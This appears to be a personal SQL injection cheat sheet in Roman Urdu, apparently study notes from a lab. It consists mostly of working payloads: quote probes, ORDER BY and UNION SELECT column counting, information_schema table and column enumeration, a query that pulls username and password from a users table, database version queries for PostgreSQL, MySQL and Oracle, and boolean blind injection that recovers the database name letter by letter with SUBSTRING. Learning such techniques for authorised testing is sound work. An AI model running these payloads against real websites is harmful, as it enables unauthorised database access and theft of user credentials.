### Basic payload for checking website is vulnerable or not

 `'`

 `"`

 `#` 

---

### Checking How many Columns

` ' ORDER BY 1--`

` ' ORDER BY 2--`

` ' ORDER BY 3--`

Jahan pr website main error ajaye jaisy ` ' ORDER BY 3--` pr too iska matlab 2 columns hain.

### Alternative Method for Checking Columns

` ' UNION SELECT NULL-- `

` ' UNION SELECT NULL,NULL-- `

` ' UNION SELECT NULL,NULL,NULL-- `

Agar ` ' UNION SELECT NULL,NULL-- ` aany pr website py yeh display hoo jaye or baki dono pr error aye too phir yani 2 columns hain.

---

### Checking which column contain text data

` ' UNION SELECT 'abc',NULL,NULL-- `

` ' UNION SELECT NULL,'abc',NULL-- `

` ' UNION SELECT NULL,NULL,'abc'-- `

Jab yeh pata chal jaye ky website main kitny columns hain too iusky baad ka step yeh check krna hota hai ky kis column main text data jaa rha hai isky liye yeh oper wali sub combinations try ki jati hain jis combination pr error na aye yani iusky andar text data jaa rha hai or iusi column sy hum data retrive krty hain.

---

### Checking Table Name

` ' UNION SELECT NULL,table_name FROM information_schema.tables--`

Table or column name ka pata hona bht zyada zaroori hai isky baghair data retrive nhi hoo skta. Database main aik jagah hoti hai jisko information schema kehty hain wahan database ky tables or columns ki information hoti hai, isi jagah sy hum yeh information nikalty hain. Oper di gyi command sy yeh pata chalta hai ky table name kya hai lekin iss sy pehly yeh pata hona zaroori hai ky kitny columns hai oper di gyi command `2 Columns` ky hissab sy hai agar `3 Columns` hon too phir yeh command hogi

` ' UNION SELECT NULL,NULL,table_name FROM information_schema.tables--`

Aik or baat yeh ky agar yeh command work na kare too phir column no change kiya jaa skta hai jaisy

` ' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--`

---

### Checking Columns Name

` ' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--`

Yeh command table name find krny ky baad daali jati hai iss command sy column name ka pata chalta hai. Jab inn dono ka pata chal jaye too final command aisy banti hai

` ' UNION SELECT username, password FROM users--`

---

### Value Concatenation 

` ' UNION SELECT username || '~' || password FROM users--`

Yeh command taab use hoti hai jab table main sirf aik column hoo or iusi sy dono cheezein nikalwani hon too phir hum iss tarah username or password dono ko combine krty hain iss process ko concatenation kehty hain.

---

Yeh sub commands hi use hoti hain SQL Injection main information gathering ky liye or yeh haar database ky liye thori bht different hoo skti hain.


### Checking Database Version

If PostgreSQL

`' UNION SELECT version(), NULL--`

If MySQL 

`' UNION SELECT @@version, NULL#`

If Oracle: (Oracle mein FROM dual likhna zaroori hota hai)

`' UNION SELECT banner, NULL FROM v$version--`

### Alternative Method

`' ORDER BY 2--`
`' ORDER BY 3--`

`' ORDER BY 2#`
`' ORDER BY 3#`

`' ORDER BY 2-- `
`' ORDER BY 3-- `

---

# BLIND SQL INJECTION 

Blind SQLi main error direct show nhi hota hamy database sy questions krny hoty hain ky agar yeh cheez exist krti hai too ' AND 1=1-- main data show kr wady agar cheez exist krti hai too data show hoo jata hai or ' AND 1=2-- pr kuch show nhi hota normal page load hota hai.


Basic Payload
`' AND 1=1--` `' AND 1=2--`
`1' AND 1=1#` `1' AND 1=2#`

### Database ki length pata lagwana

Ab hum database se True/False wale sawal poochenge. Pehle poochna hai ke Current Database Name ki length kitni hai:

`1' AND LENGTH(database())=1#`

**(Agar page normal load hua yani lenth 1 nhi hai too isko barhain gy)**


`1' AND LENGTH(database())=2#`

**(phir normal load hua phir barhaein gy)**

`1' AND LENGTH(database())=4#`

ab agar waqai main 4 length hue too page pr kuch changing aye gi ya kuch show hoo jaye ga

### First Letter Extraction (SUBSTRING)

​Database ka pehla letter pakadne ke liye hum SUBSTRING() function use karte hain:

`1' AND SUBSTRING(database(), 1, 1)='a'#`

Agar database ka pehla letter 'a' hua, toh page bolega User ID exists in the database.

Agar database ka pehla letter 'd' ya kuch or hua, toh page bolega User ID is MISSING from the database.

`1' AND SUBSTRING(database(), 1, 1)='d'#`


**Isi tarah hum SUBSTRING(database(), 2, 1)='v' kar ke doosra letter verify karte hain**

---